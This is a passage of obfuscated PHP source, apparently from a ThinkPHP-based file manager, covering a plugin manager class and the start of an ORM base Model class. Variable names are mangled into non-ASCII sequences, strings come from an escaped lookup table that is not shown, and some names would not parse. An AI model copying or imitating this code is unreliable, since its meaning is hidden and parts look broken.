$¹¹¾€§€[483] => $ƒ›ëæÖ¢, $¹¹¾€§€[423] => $¹¹¾€§€[1934] . $äĞĞ±äá, $¹¹¾€§€[422] => $¦Õ…ƒöÊ); return $this->where($á÷‘¥öç)->delete(); } protected function removeByTag($šÊ¼ø”, $Íß¢è²) { $ÌªğêÎÊ =& $_SERVER[Ãìšã«™]; if (!$this->getByTagID($šÊ¼ø”, $Íß¢è²)) { return !1; } $‚… ù = array($ÌªğêÎÊ[1641] => 0, $ÌªğêÎÊ[483] => $Íß¢è², $ÌªğêÎÊ[423] => $ÌªğêÎÊ[1934] . $šÊ¼ø”); return $this->where($‚… ù)->delete(); } protected function removeBySource($©‡®ŠÊ, $å¬Úïî) { $ÄßÖøÀ¯ =& $_SERVER[Ãìšã«™]; if (!$©‡®ŠÊ || !$å¬Úïî) { return !1; } if (is_array($å¬Úïî)) { $å¬Úïî = array($ÄßÖøÀ¯[7], $å¬Úïî); } $ùÚüÁøñ = array($ÄßÖøÀ¯[1641] => 0, $ÄßÖøÀ¯[422] => $å¬Úïî, $ÄßÖøÀ¯[483] => array($ÄßÖøÀ¯[1010], 0), $ÄßÖøÀ¯[423] => $ÄßÖøÀ¯[1934] . $©‡®ŠÊ); return $this->where($ùÚüÁøñ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\160\154\165\147\151\x6e\x4c\151\163\164"; public $field = array("\156\x61\x6d\145", "\x73\164\141\164\165\x73", "\x72\x65\147\x69\x65\x73\164", "\143\x6f\x6e\146\x69\x67"); public function loadList($ıü§ı–ı = false) { $—ÔªıíÑ = array_to_keyvalue($this->listData(), $_SERVER[Ãìšã«™][32]); if ($ıü§ı–ı) { return $—ÔªıíÑ[$ıü§ı–ı]; } return $—ÔªıíÑ; } public function init() { $ÀİÂ¶ÎÎ =& $_SERVER[Ãìšã«™]; Hook::trigger($ÀİÂ¶ÎÎ[1935]); $ú»•˜“’ = $this->loadPluginList(); foreach ($ú»•˜“’ as $ã…‘¹ğæ => $ò±ß£›Î) { $ï›†Ÿ¼ = $this->appAllow($ã…‘¹ğæ, $ò±ß£›Î); if (!$ï›†Ÿ¼) { continue; } foreach ($ò±ß£›Î[$ÀİÂ¶ÎÎ[1936]] as $óËŒìè§ => $Üéìû×¹) { Hook::bind($óËŒìè§, $Üéìû×¹); } } Hook::trigger($ÀİÂ¶ÎÎ[1937]); Hook::trigger(ACTION); } public function appAllow($Â¡½¥ü, $Æ¡ğÑ¤é, $œÖÎÙ­ê = true) { $Èä·Ó¡ =& $_SERVER[Ãìšã«™]; $‰’™ñç› = PLUGIN_DIR . $Â¡½¥ü . $Èä·Ó¡[1938]; if (!is_array($Æ¡ğÑ¤é) || !is_array($Æ¡ğÑ¤é[$Èä·Ó¡[1936]]) || $Æ¡ğÑ¤é[$Èä·Ó¡[751]] != 1 || !is_file($‰’™ñç›)) { return !1; } if ($GLOBALS[$Èä·Ó¡[505]] == 1) { return !0; } if ($œÖÎÙ­ê && !Action($Èä·Ó¡[1939])->checkAuth($Â¡½¥ü)) { return !1; } return !0; } public function unInstall($óß¿÷î) { $ÃìöÖÙú =& $_SERVER[Ãìšã«™]; $çŒÓİÅ· = $this->loadList($óß¿÷î); if (file_exists(PLUGIN_DIR . $óß¿÷î)) { Hook::apply($óß¿÷î . $ÃìöÖÙú[1940]); } $this->remove($çŒÓİÅ·[$ÃìöÖÙú[392]]); } public function changeStatus($©è®º“, $ÙŠÏÌ÷á) { $¾‡–ä—Ò =& $_SERVER[Ãìšã«™]; $ş³ºä›Í = $this->loadList($©è®º“); if ($ÙŠÏÌ÷á) { Hook::apply($©è®º“ . $¾‡–ä—Ò[1941]); } $this->update($ş³ºä›Í[$¾‡–ä—Ò[392]], array($¾‡–ä—Ò[1942] => $ÙŠÏÌ÷á)); } public function appRegist($ªƒÊ©İ˜, $‡‘ŞÅ¢ö) { $ïıˆÉø• =& $_SERVER[Ãìšã«™]; $ş öã§Ë = $this->loadList($ªƒÊ©İ˜); if ($ş öã§Ë) { $this->update($ş öã§Ë[$ïıˆÉø•[392]], array($ïıˆÉø•[1936] => $‡‘ŞÅ¢ö)); } else { $Ğ–˜œ›£ = array($ïıˆÉø•[32] => $ªƒÊ©İ˜, $ïıˆÉø•[1936] => $‡‘ŞÅ¢ö, $ïıˆÉø•[751] => 0, $ïıˆÉø•[6] => $this->getConfigDefault($ªƒÊ©İ˜)); $this->insert($Ğ–˜œ›£); } } public function getConfigDefault($ïËøŞ÷’) { $…¬çæè =& $_SERVER[Ãìšã«™]; $¥òÀåºê = array(); $éæ’·•» = $this->getPackageJson($ïËøŞ÷’); if (!$éæ’·•» && is_array($éæ’·•»[$…¬çæè[1943]])) { return $¥òÀåºê; } foreach ($éæ’·•»[$…¬çæè[1943]] as $û™ùå¬Œ => $£ŠıçšÖ) { if (!isset($£ŠıçšÖ[$…¬çæè[369]]) || isset($¥òÀåºê[$û™ùå¬Œ])) { continue; } $¥òÀåºê[$û™ùå¬Œ] = $£ŠıçšÖ[$…¬çæè[369]]; } return $¥òÀåºê; } public function getPackageJson($ƒÁäåêó) { return Hook::apply($ƒÁäåêó . $_SERVER[Ãìšã«™][1944]); } public function getConfig($Ô’ì®¨À, $ÎÍàÙú = false) { $øÄ†„èÚ =& $_SERVER[Ãìšã«™]; $¨ÅÃ‚æ = array(); $šË«ŠÀû = $this->loadList($Ô’ì®¨À); if ($šË«ŠÀû && is_array($šË«ŠÀû[$øÄ†„èÚ[6]])) { $¨ÅÃ‚æ = $šË«ŠÀû[$øÄ†„èÚ[6]]; } if (!$¨ÅÃ‚æ || $ÎÍàÙú) { $¨ÅÃ‚æ = $this->getConfigDefault($Ô’ì®¨À); } return $¨ÅÃ‚æ; } public function setConfig($á®ÑşÙ, $½á¡äµÖ = false) { $³±ğ“†À =& $_SERVER[Ãìšã«™]; $ËºÅ‚ı» = $this->loadList($á®ÑşÙ); if (!$ËºÅ‚ı») { return !1; } $Ÿ¹Ÿ§Òİ = $ËºÅ‚ı»[$³±ğ“†À[6]]; if ($½á¡äµÖ == !1) { $Ÿ¹Ÿ§Òİ = array(); $½á¡äµÖ = $this->getConfigDefault($á®ÑşÙ); } foreach ($½á¡äµÖ as $¯–¸Ô° => $âê»“•¢) { $Ÿ¹Ÿ§Òİ[$¯–¸Ô°] = is_string($âê»“•¢) ? trim($âê»“•¢) : $âê»“•¢; } $this->update($ËºÅ‚ı»[$³±ğ“†À[392]], array($³±ğ“†À[6] => $Ÿ¹Ÿ§Òİ)); } public function viewList() { $ËáÅŞ›ã =& $_SERVER[Ãìšã«™]; $ã­¼ãÀ¶ = $this->loadList(); $this->pluginScan($ã­¼ãÀ¶); $ã­¼ãÀ¶ = $this->loadPluginList(); $ª®¶©¶‘ = array(); foreach ($ã­¼ãÀ¶ as $ËàŸ€”ı => $í’²“Å‘) { unset($í’²“Å‘[$ËáÅŞ›ã[1936]], $í’²“Å‘[$ËáÅŞ›ã[6]]); $¡áÉ§° = PLUGIN_DIR . $í’²“Å‘[$ËáÅŞ›ã[32]] . $ËáÅŞ›ã[1938]; if (!is_file($¡áÉ§°)) { continue; } $ÃÛÒşœë = Hook::apply($í’²“Å‘[$ËáÅŞ›ã[32]] . $ËáÅŞ›ã[1944]); if (is_array($ÃÛÒşœë)) { $ª®¶©¶‘[$ËàŸ€”ı] = array_merge($í’²“Å‘, $ÃÛÒşœë); } } return $ª®¶©¶‘; } private function loadPluginList() { $Ö®àÓáÂ =& $_SERVER[Ãìšã«™]; $Ø Šë¶ = $this->loadList(); if (strtolower(MOD) == $Ö®àÓáÂ[1945]) { return $Ø Šë¶; } $úÉÉ¸ı = Hook::trigger($Ö®àÓáÂ[1946], $Ø Šë¶); if ($Ø Šë¶ && !$úÉÉ¸ı) { die; } return $úÉÉ¸ı ? $úÉÉ¸ı : $Ø Šë¶; } private function pluginScan($Ë‘Ï‚) { $ ô­äó =& $_SERVER[Ãìšã«™]; recursion_dir(PLUGIN_DIR, $€¿åìÚ¶, $ğô°×´ı, 0); foreach ($€¿åìÚ¶ as $«¼•–Áû) { $¸‰Ü­¯ = get_path_this($«¼•–Áû); if (isset($Ë‘Ï‚[$¸‰Ü­¯]) || !file_exists($«¼•–Áû . $ ô­äó[1947]) || !file_exists($«¼•–Áû . $ ô­äó[1938])) { continue; } Hook::apply($¸‰Ü­¯ . $ ô­äó[1941]); } } } goto EĞŒÓåíˆ†; dÉ’ÏñÕÈè: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\x6f\162\x64\145\162", "\x61\x6c\151\141\x73", "\150\x61\166\151\x6e\x67", "\147\162\x6f\x75\160", "\154\x6f\143\x6b", "\144\x69\x73\164\x69\156\x63\164", "\x61\x75\164\x6f", "\146\151\x6c\164\x65\x72", "\166\x61\154\151\x64\141\164\x65", "\x72\x65\x73\165\154\164", "\x62\151\156\144", "\x74\157\x6b\145\156"); public function __construct($µñáàø¾ = '', $ï ÎµŠ = '', $ıú…ÌçÍ = '') { $è„­£õ­ =& $_SERVER[Ãìšã«™]; $this->_initialize(); if (!empty($µñáàø¾)) { if (strpos($µñáàø¾, $è„­£õ­[10])) { list($this->dbName, $this->name) = explode($è„­£õ­[10], $µñáàø¾); } else { $this->name = $µñáàø¾; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ï ÎµŠ)) { $this->tablePrefix = $è„­£õ­[12]; } elseif ($è„­£õ­[12] != $ï ÎµŠ) { $this->tablePrefix = $ï ÎµŠ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($è„­£õ­[239]); } $this->db(0, empty($this->connection) ? $ıú…ÌçÍ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ìĞÁ¦¨ =& $_SERVER[Ãìšã«™]; if (empty($this->fields)) { if (think_config($ìĞÁ¦¨[240])) { $É¹Ñ¢§ = $this->dbName ? $this->dbName : think_config($ìĞÁ¦¨[241]); $ì³·±§Ü = think_var_cache($ìĞÁ¦¨[242] . strtolower(get_path_this($É¹Ñ¢§) . $ìĞÁ¦¨[10] . $this->name)); if ($ì³·±§Ü) { $¾ãõÛğã = think_config($ìĞÁ¦¨[243]); if (empty($¾ãõÛğã) || $ì³·±§Ü[$ìĞÁ¦¨[244]] == $¾ãõÛğã) { $this->fields = $ì³·±§Ü; return; } } } $this->flush(); } } public function flush() { $²û½€Ää =& $_SERVER[Ãìšã«™]; $this->db->setModel($this->name); $Ë —ª¥Ö = $this->db->getFields($this->getTableName()); if (!$Ë —ª¥Ö) { return !1; } $this->fields = array_keys($Ë —ª¥Ö); $this->fields[$²û½€Ää[245]] = !1; foreach ($Ë —ª¥Ö as $ÖùÙ‹Ğö => $€ÃÈ¾÷) { $´€‰­•Ò[$ÖùÙ‹Ğö] = $€ÃÈ¾÷[$²û½€Ää[33]]; if ($€ÃÈ¾÷[$²û½€Ää[39]]) { $this->fields[$²û½€Ää[246]] = $ÖùÙ‹Ğö; if ($€ÃÈ¾÷[$²û½€Ää[42]]) { $this->fields[$²û½€Ää[245]] = !0; } } } $this->fields[$²û½€Ää[247]] = $´€‰­•Ò; if (think_config($²û½€Ää[243])) { $this->fields[$²û½€Ää[244]] = think_config($²û½€Ää[243]); } if (think_config($²û½€Ää[240])) { $†–’µ†è = $this->dbName ? $this->dbName : think_config($²û½€Ää[241]); think_var_cache($²û½€Ää[242] . strtolower(get_path_this($†–’µ†è) . $²û½€Ää[10] . $this->name), $this->fields); } } public function switchModel($­Ş´â•, $½¯”¿µ = array()) { $Å½ä«ë =& $_SERVER[Ãìšã«™]; $‚¢×›«İ = ucwords(strtolower($­Ş´â•)) . $Å½ä«ë[248]; if (!class_exists($‚¢×›«İ)) { think_exception($‚¢×›«İ . think_lang($Å½ä«ë[249])); } $this->_extModel = new $‚¢×›«İ($this->name); if (!empty($½¯”¿µ)) { foreach ($½¯”¿µ as $„ŞĞšÒ) { $this->_extModel->setProperty($„ŞĞšÒ, $this->{$„ŞĞšÒ}); } } return $this->_extModel; } public function __set($Ë…»¨ô, $Ïˆ­…Š) { $this->data[$Ë…»¨ô] = $Ïˆ­…Š; } public function __get($¬öê°äÏ) { return isset($this->data[$¬öê°äÏ]) ? $this->data[$¬öê°äÏ] : null; } public function __isset($ÓªÛˆéÂ) { return isset($this->data[$ÓªÛˆéÂ]); } public function __unset($˜€Àèûˆ) { unset($this->data[$˜€Àèûˆ]); } public function __call($÷ƒÇü†—, $À†–İ§) { $‹••øÑ× =& $_SERVER[Ãìšã«™]; if (in_array(strtolower($÷ƒÇü†—), $this->methods, !0)) { $this->options[strtolower($÷ƒÇü†—)] = $À†–İ§[0]; return $this; } elseif (in_array(strtolower($÷ƒÇü†—), array($‹••øÑ×[250], $‹••øÑ×[251], $‹••øÑ×[252], $‹••øÑ×[253], $‹••øÑ×[254]), !0)) { $ŞÁÖ¾¦Ó = isset($À†–İ§[0]) ? $À†–İ§[0] : $‹••øÑ×[181]; $ŞÁÖ¾¦Ó = $this->db->parseKey($ŞÁÖ¾¦Ó); return $this->getField(strtoupper($÷ƒÇü†—) . $‹••øÑ×[255] . $ŞÁÖ¾¦Ó . $‹••øÑ×[256] . $÷ƒÇü†—, $‹••øÑ×[250]); } elseif (strtolower(substr($÷ƒÇü†—, 0, 5)) == $‹••øÑ×[257]) { $ŞÁÖ¾¦Ó = think_parse_name(substr($÷ƒÇü†—, 5)); $†°¸ì®[$ŞÁÖ¾¦Ó] = $À†–İ§[0]; return $this->where($†°¸ì®)->find(); } elseif (strtolower(substr($÷ƒÇü†—, 0, 10)) == $‹••øÑ×[258]) { $­ËŒ­šÓ = think_parse_name(substr($÷ƒÇü†—, 10)); $†°¸ì®[$­ËŒ­šÓ] = $À†–İ§[0]; return $this->where($†°¸ì®)->getField($À†–İ§[1]); } elseif (isset($this->_scope[$÷ƒÇü†—])) { return $this->scope($÷ƒÇü†—, $À†–İ§[0]); } elseif (method_exists($this, $÷ƒÇü†—)) { array_unshift($À†–İ§, $÷ƒÇü†—); return call_user_func_array(array($this, $‹••øÑ×[259]), $À†–İ§); } else { return call_user_func_array(array(parent, $÷ƒÇü†—), $À†–İ§); } } protected function call() { $‘ã¯³…œ =& $_SERVER[Ãìšã«™]; $ÄŸÓš›¤ = func_get_args(); $ùÃ”…ÒÏ = array_shift($ÄŸÓš›¤); $­ò·³ = $ùÃ”…ÒÏ; if (is_array($ùÃ”…ÒÏ)) { $­ò·³ = $ùÃ”…ÒÏ[1]; $ùÃ”…ÒÏ = $ùÃ”…ÒÏ[0]; } $úüœ¿ÆŞ = count($ÄŸÓš›¤) - 1; if (isset($ÄŸÓš›¤[$úüœ¿ÆŞ]) && $ÄŸÓš›¤[$úüœ¿ÆŞ] === $ùÃ”…ÒÏ) { think_exception(__CLASS__ . $‘ã¯³…œ[4] . $ùÃ”…ÒÏ . think_lang($‘ã¯³…œ[260])); return; } $ÄŸÓš›¤[] = $ùÃ”…ÒÏ; if (method_exists($this, $‘ã¯³…œ[261])) { $‘”Á–§Œ = call_user_func_array(array($this, $‘ã¯³…œ[262]), array($­ò·³, $ÄŸÓš›¤)); if (!is_null($‘”Á–§Œ) && $‘”Á–§Œ !== !1) { return $‘”Á–§Œ; } } $€ë”æùÈ = call_user_func_array(array($this, $ùÃ”…ÒÏ), $ÄŸÓš›¤); if (method_exists($this, $‘ã¯³…œ[263])) { $‘”Á–§Œ = call_user_func_array(array($this, $‘ã¯³…œ[264]), array($­ò·³, $ÄŸÓš›¤, $€ë”æùÈ)); if ($‘”Á–§Œ) { return $‘”Á–§Œ; } } return $€ë”æùÈ; } protected function _initialize() { } protected function _facade($“ÙÙ¨‚à) { $•ÃŞ =& $_SERVER[Ãìšã«™]; if (!empty($this->fields)) { foreach ($“ÙÙ¨‚à as $°ù°öù± => $¿Æ­Æ¢) { if (is_array($this->fields) && !in_array($°ù°öù±, $this->fields, !0)) { unset($“ÙÙ¨‚à[$°ù°öù±]); } elseif (is_scalar($¿Æ­Æ¢)) { $this->_parseType($“ÙÙ¨‚à, $°ù°öù±); } } } if (!empty($this->options[$•ÃŞ[265]])) { $“ÙÙ¨‚à = array_map($this->options[$•ÃŞ[265]], $“ÙÙ¨‚à); unset($this->options[$•ÃŞ[265]]); } $this->_beforeWrite($“ÙÙ¨‚à); return $“ÙÙ¨‚à; } protected function _beforeWrite(&$İ±©šÙÓ) { } public function add($Âç•ÎÖ‹ = '', $Ñò‹Ë†Ë = array(), $ù¨ƒ‡ú¸ = false) { if (empty($Âç•ÎÖ‹)) { if (!empty($this->data)) { $Âç•ÎÖ‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ãìšã«™][266]); return !1; } } $Ñò‹Ë†Ë = $this->_parseOptions($Ñò‹Ë†Ë); $Âç•ÎÖ‹ = $this->_facade($Âç•ÎÖ‹); if (!1 === $this->_beforeInsert($Âç•ÎÖ‹, $Ñò‹Ë†Ë)) { return !1; } $Êùúêª¥ = $this->db->insert($Âç•ÎÖ‹, $Ñò‹Ë†Ë, $ù¨ƒ‡ú¸); if (!1 !== $Êùúêª¥) { $¼«ôøÛª = $this->getLastInsID(); if ($¼«ôøÛª) { $Âç•ÎÖ‹[$this->getPk()] = $¼«ôøÛª; $this->_after_insert($Âç•ÎÖ‹, $Ñò‹Ë†Ë); return $¼«ôøÛª; } $this->_after_insert($Âç•ÎÖ‹, $Ñò‹Ë†Ë); } return $Êùúêª¥; } protected function _beforeInsert(&$öê´æè¦, $Êîî©) { } protected function _after_insert($ëÉ–³, $ÈÎ–¿†Ğ) { } public function addAll($ÍŒí¨À’, $óæ¯éÇ¶ = array(), $ç²ş±á = false) { $Ğ¥¢ğ¨¼ =& $_SERVER[Ãìšã«™]; if (empty($ÍŒí¨À’)) { $this->error = think_lang($Ğ¥¢ğ¨¼[266]); return !1; } $óæ¯éÇ¶ = $this->_parseOptions($óæ¯éÇ¶); foreach ($ÍŒí¨À’ as $ôª×ù‘Ï => $º‹˜¢×) { $ÍŒí¨À’[$ôª×ù‘Ï] = $this->_facade($º‹˜¢×); } if (method_exists($this->db, $Ğ¥¢ğ¨¼[267])) { $äğÌ‰  = $this->db->insertAll($ÍŒí¨À’, $óæ¯éÇ¶, $ç²ş±á); } else { $this->startTrans(); foreach ($ÍŒí¨À’ as $ôª×ù‘Ï => $º‹˜¢×) { $äğÌ‰  = $this->db->insert($º‹˜¢×, $óæ¯éÇ¶, $ç²ş±á); } $this->commit(); } if (!1 !== $äğÌ‰ ) { $ó×ƒè¿ = $this->getLastInsID(); if ($ó×ƒè¿) { return $ó×ƒè¿; } } return $äğÌ‰ ; } public function selectAdd($ĞÅß÷¯ª = '', $—äÚ£òÍ = '', $ª“ßˆÕí = array()) { $±Ò‘ÆäŒ =& $_SERVER[Ãìšã«™]; $ª“ßˆÕí = $this->_parseOptions($ª“ßˆÕí); if (!1 === ($‹ñî³·İ = $this->db->selectInsert($ĞÅß÷¯ª ? $ĞÅß÷¯ª : $ª“ßˆÕí[$±Ò‘ÆäŒ[268]], $—äÚ£òÍ ? $—äÚ£òÍ : $this->getTableName(), $ª“ßˆÕí))) { $this->error = think_lang($±Ò‘ÆäŒ[269]); return !1; } else { return $‹ñî³·İ; } } public function save($å»‘Üåİ = '', $ëÁ›€½ = array()) { $˜½”İ =& $_SERVER[Ãìšã«™]; if (empty($å»‘Üåİ)) { if (!empty($this->data)) { $å»‘Üåİ = $this->data; $this->data = array(); } else { $this->error = think_lang($˜½”İ[266]); return !1; } } $å»‘Üåİ = $this->_facade($å»‘Üåİ); $ëÁ›€½ = $this->_parseOptions($ëÁ›€½); $¹ïè§Í = $this->getPk(); if (!isset($ëÁ›€½[$˜½”İ[270]])) { if (isset($å»‘Üåİ[$¹ïè§Í])) { $ûÅ„ÕÔÒ[$¹ïè§Í] = $å»‘Üåİ[$¹ïè§Í]; $ëÁ›€½[$˜½”İ[270]] = $ûÅ„ÕÔÒ; unset($å»‘Üåİ[$¹ïè§Í]); } else { $this->error = think_lang($˜½”İ[269]); return !1; } } if (is_array($ëÁ›€½[$˜½”İ[270]]) && isset($ëÁ›€½[$˜½”İ[270]][$¹ïè§Í])) { $¯¾·à…˜ = $ëÁ›€½[$˜½”İ[270]][$¹ïè§Í]; } if (!1 === $this->_beforeUpdate($å»‘Üåİ, $ëÁ›€½)) { return !1; } $áš¡ÃŞ´ = $this->db->update($å»‘Üåİ, $ëÁ›€½); if (!1 !== $áš¡ÃŞ´) { if (isset($¯¾·à…˜)) { $å»‘Üåİ[$¹ïè§Í] = $¯¾·à…˜; } $this->_afterUpdate($å»‘Üåİ, $ëÁ›€½); } return $áš¡ÃŞ´; } protected function _beforeUpdate(&$ÌİÏîø, $şÀ«Ïä) { } protected function _afterUpdate($á¢ı´¿¾, $¹’¡ÖÂ—) { } public function delete($ßºì•‚› = array()) { $ï‹ ó°Ú =& $_SERVER[Ãìšã«™]; if (empty($ßºì•‚›) && empty($this->options[$ï‹ ó°Ú[270]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $™ä¤ªõ = $this->getPk(); if (is_numeric($ßºì•‚›) || is_string($ßºì•‚›)) { if (strpos($ßºì•‚›, $ï‹ ó°Ú[50])) { $¦ßãÙÒ[$™ä¤ªõ] = array($ï‹ ó°Ú[271], $ßºì•‚›); } else { $¦ßãÙÒ[$™ä¤ªõ] = $ßºì•‚›; } $this->options[$ï‹ ó°Ú[270]] = $¦ßãÙÒ; } $ßºì•‚› = $this->_parseOptions(); if (is_array($ßºì•‚›[$ï‹ ó°Ú[270]]) && isset($ßºì•‚›[$ï‹ ó°Ú[270]][$™ä¤ªõ])) { $ƒíìáŠØ = $ßºì•‚›[$ï‹ ó°Ú[270]][$™ä¤ªõ]; } $–é”Ôö• = $this->db->delete($ßºì•‚›); if (!1 !== $–é”Ôö•) { $óØ¯şğí = array(); if (isset($ƒíìáŠØ)) { $óØ¯şğí[$™ä¤ªõ] = $ƒíìáŠØ; } $this->_after_delete($óØ¯şğí, $ßºì•‚›); } return $–é”Ôö•; } protected function _after_delete($Õ‡´Î™Ğ, $¸øÍÑ „) { } public function select($¢Œş ’¼ = array()) { $È×ô«¢÷ =& $_SERVER[Ãìšã«™]; if (is_string($¢Œş ’¼) || is_numeric($¢Œş ’¼)) { $Ø°È Ö¹ = $this->getPk(); if (strpos($¢Œş ’¼, $È×ô«¢÷[50])) { $š¡¾Ø[$Ø°È Ö¹] = array($È×ô«¢÷[271], $¢Œş ’¼); } else { $š¡¾Ø[$Ø°È Ö¹] = $¢Œş ’¼; } $this->options[$È×ô«¢÷[270]] = $š¡¾Ø; } elseif (!1 === $¢Œş ’¼) { $¢Œş ’¼ = $this->_parseOptions(); return $È×ô«¢÷[272] . $this->db->buildSelectSql($¢Œş ’¼) . $È×ô«¢÷[273]; } $¢Œş ’¼ = $this->_parseOptions(); $ŒÆú€ Î = $this->db->select($¢Œş ’¼); if (!1 === $ŒÆú€ Î) { return !1; } if (empty($ŒÆú€ Î)) { return null; } $this->_afterSelect($ŒÆú€ Î, $¢Œş ’¼); return $ŒÆú€ Î; } protected function _afterSelect(&$é¬¥ÜÕ´, $°ÜİîâÉ) { } public function buildSql($î™á¾à² = array()) { $óíœÒ¦ğ =& $_SERVER[Ãìšã«™]; $î™á¾à² = $this->_parseOptions($î™á¾à²); return $óíœÒ¦ğ[272] . $this->db->buildSelectSql($î™á¾à²) . $óíœÒ¦ğ[273]; } public function optionsValue($ Ø­ü¶“ = null) { if (is_null($ Ø­ü¶“)) { return $this->options; } elseif (is_array($ Ø­ü¶“)) { $this->options = array_merge($this->options, $ Ø­ü¶“); } } protected function _parseOptions($ô…Ì©â = array()) { $Ø±„Ó¹ =& $_SERVER[Ãìšã«™]; if (is_array($ô…Ì©â)) { $ô…Ì©â = array_merge($this->options, $ô…Ì©â); } $this->options = array(); if (!isset($ô…Ì©â[$Ø±„Ó¹[274]])) { $ô…Ì©â[$Ø±„Ó¹[274]] = $this->getTableName(); $°é²ı¬ = $this->fields; } else { $°é²ı¬ = $this->getDbFields(); } if (!empty($ô…Ì©â[$Ø±„Ó¹[275]])) { $ô…Ì©â[$Ø±„Ó¹[274]] .= $Ø±„Ó¹[53] . $ô…Ì©â[$Ø±„Ó¹[275]]; } $ô…Ì©â[$Ø±„Ó¹[276]] = $this->name; if (isset($ô…Ì©â[$Ø±„Ó¹[270]]) && is_array($ô…Ì©â[$Ø±„Ó¹[270]]) && !empty($°é²ı¬) && !isset($ô…Ì©â[$Ø±„Ó¹[277]]) && !isset($ô…Ì©â[$Ø±„Ó¹[274]])) { foreach ($ô…Ì©â[$Ø±„Ó¹[270]] as $¿Øƒ©ğš => $ï’¨ì»á) { $¿Øƒ©ğš = trim($¿Øƒ©ğš); if (in_array($¿Øƒ©ğš, $°é²ı¬, !0)) { if (is_scalar($ï’¨ì»á)) { $this->_parseType($ô…Ì©â[$Ø±„Ó¹[270]], $¿Øƒ©ğš); } } elseif (!is_numeric($¿Øƒ©ğš) && $Ø±„Ó¹[11] != substr($¿Øƒ©ğš, 0, 1) && !1 === strpos($¿Øƒ©ğš, $Ø±„Ó¹[10]) && !1 === strpos($¿Øƒ©ğš, $Ø±„Ó¹[255]) && !1 === strpos($¿Øƒ©ğš, $Ø±„Ó¹[278]) && !1 === strpos($¿Øƒ©ğš, $Ø±„Ó¹[279])) { unset($ô…Ì©â[$Ø±„Ó¹[270]][$¿Øƒ©ğš]); } } } $this->_options_filter($ô…Ì©â); return $ô…Ì©â; } protected function _options_filter(&$ˆĞô˜Ú) { } protected function _parseType(&$“âŸÍ¦£, $ÀªŠ›¼) { $Æ¡¤¾œŒ =& $_SERVER[Ãìšã«™]; if (empty($this->options[$Æ¡¤¾œŒ[280]][$Æ¡¤¾œŒ[4] . $ÀªŠ›¼])) { $àÔ€¬ç‰ = strtolower($this->fields[$Æ¡¤¾œŒ[247]][$ÀªŠ›¼]); if (!1 !== strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[281])) { } elseif (!1 === strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[282]) && !1 !== strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[283])) { $“âŸÍ¦£[$ÀªŠ›¼] = intval($“âŸÍ¦£[$ÀªŠ›¼]); } elseif (!1 !== strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[284]) || !1 !== strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[285])) { $“âŸÍ¦£[$ÀªŠ›¼] = floatval($“âŸÍ¦£[$ÀªŠ›¼]); } elseif (!1 !== strpos($àÔ€¬ç‰, $Æ¡¤¾œŒ[286])) { $“âŸÍ¦£[$ÀªŠ›¼] = (bool) $“âŸÍ¦£[$ÀªŠ›¼]; } } } public function find($ÊÑäÖÊ’ = array()) { $˜³ş®üà =& $_SERVER[Ãìšã«™]; if (is_numeric($ÊÑäÖÊ’) || is_string($ÊÑäÖÊ’)) { $§Ç„µÑ¶[$this->getPk()] = intval($ÊÑäÖÊ’); $this->options[$˜³ş®üà[270]] = $§Ç„µÑ¶; } $this->options[$˜³ş®üà[287]] = 1; $ÊÑäÖÊ’ = $this->_parseOptions(); $€™âƒéî = $this->db->select($ÊÑäÖÊ’); if (!1 === $€™âƒéî) { return !1; } if (empty($€™âƒéî)) { return null; } $this->data = $€™âƒéî[0]; $this->_afterFind($this->data, $ÊÑäÖÊ’); if (!empty($this->options[$˜³ş®üà[288]])) { return $this->returnResult($this->data, $this->options[$˜³ş®üà[288]]); } return $this->data; } protected function _afterFind(&$ª‡Ÿ¡ ¯, $Š¼ß‹›Í) { } protected function returnResult($ş§éÜ¿±, $ÌÎİ½ª = '') { $áõ¸Ø‰ =& $_SERVER[Ãìšã«™]; if ($ÌÎİ½ª) { if (is_callable($ÌÎİ½ª)) { return call_user_func($ÌÎİ½ª, $ş§éÜ¿±); } switch (strtolower($ÌÎİ½ª)) { case $áõ¸Ø‰[289]: return json_encode($ş§éÜ¿±); case $áõ¸Ø‰[290]: return xml_encode($ş§éÜ¿±); } } return $ş§éÜ¿±; } public function parseFieldsMap($Ê«˜ áà, $ÈÃÂã å = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ŒÚµ¢·Ú => $ç›Ò¸Î¥) { if ($ÈÃÂã å == 1) { if (isset($Ê«˜ áà[$ç›Ò¸Î¥])) { $Ê«˜ áà[$ŒÚµ¢·Ú] = $Ê«˜ áà[$ç›Ò¸Î¥]; unset($Ê«˜ áà[$ç›Ò¸Î¥]); } } else { if (isset($Ê«˜ áà[$ŒÚµ¢·Ú])) { $Ê«˜ áà[$ç›Ò¸Î¥] = $Ê«˜ áà[$ŒÚµ¢·Ú]; unset($Ê«˜ áà[$ŒÚµ¢·Ú]); } } } } return $Ê«˜ áà; } public function setField($Ã¿€½Â, $¼êº¹û× = '') { if (is_array($Ã¿€½Â)) { $ÅË—áØ = $Ã¿€½Â; } else { $ÅË—áØ[$Ã¿€½Â] = $¼êº¹û×; } return $this->save($ÅË—áØ); } public function setAdd($¢ïËù, $­ÀßØÚà = 1) { $äƒ‹Ãşª =& $_SERVER[Ãìšã«™]; $îÌïÏ‚ = $¢ïËù . $äƒ‹Ãşª[291] . $­ÀßØÚà; if ($­ÀßØÚà < 0) { $îÌïÏ‚ = 